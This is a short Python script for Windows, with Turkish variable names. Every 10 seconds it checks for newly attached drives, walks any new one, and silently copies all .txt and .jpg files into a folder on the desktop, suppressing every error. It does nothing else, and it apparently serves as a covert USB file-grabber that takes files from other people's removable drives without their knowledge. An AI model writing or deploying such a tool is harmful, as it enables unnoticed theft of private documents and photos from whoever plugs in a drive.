from ctypes import windll
import string
import time
import os
import shutil

def surucu_bul():

    bitmask=windll.kernel32.GetLogicalDrives()

    suruculer=list()

    for harf in string.ascii_uppercase:
        if bitmask & 1:
            suruculer.append(harf)

        bitmask >>= 1

    return suruculer

username=os.getlogin()

if not os.path.exists("C:/Users/"+username+"/Desktop/Kopya_Klasor"):
    os.mkdir("C:/Users/"+username+"/Desktop/Kopya_Klasor")

while True:

    try:
    
        ilk=surucu_bul()
        
        time.sleep(10)
        
        ikinci=surucu_bul()
        
        if len(ikinci) > len(ilk):
        
            usb_surucu=set(ikinci)-set(ilk)
        
            for surucu in usb_surucu:

                 for klasor_yolu,klasor_ismi,dosya_ismi in os.walk(surucu+":/"):
                
                    for x in dosya_ismi:
                        if x.endswith(".txt") or x.endswith(".jpg"):
        
                            shutil.copy(klasor_yolu+"/"+x, "C:/Users/"+username+"/Desktop/Kopya_Klasor")
        
    except:

        pass

   